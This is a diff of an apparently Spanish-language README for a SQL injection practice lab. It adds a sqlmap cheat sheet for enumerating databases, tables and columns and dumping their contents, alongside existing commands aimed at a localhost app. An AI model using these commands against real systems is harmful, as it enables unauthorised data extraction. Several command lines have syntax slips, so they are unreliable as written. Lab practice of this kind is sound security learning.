@@ -46,3 +46,21 @@ sqlmap -u "http://localhost:3000/search/*" --dbms="SQLite" --risk=3 --level=5 --
 sqlmap -u "http://localhost:3000/search/*" --dbms="SQLite" --risk=3 --level=5 -T inyections --dump -v 3
 ```
 
+Ayuda SQLMAP.
+
+```
+/sqlmap.py -u URL --dbs/ 
+/sqlmap.py -u URL -D --table    
+/sqlmap.py -u URL -D -T -columns
+/sqlmap.py -u URL -D -T -C --dump
+
+
+-D:Base de datos
+-T:Tablas
+-C:Columnas
+-U:Usurio
+
+--table 
+--columns
+--dump
+```
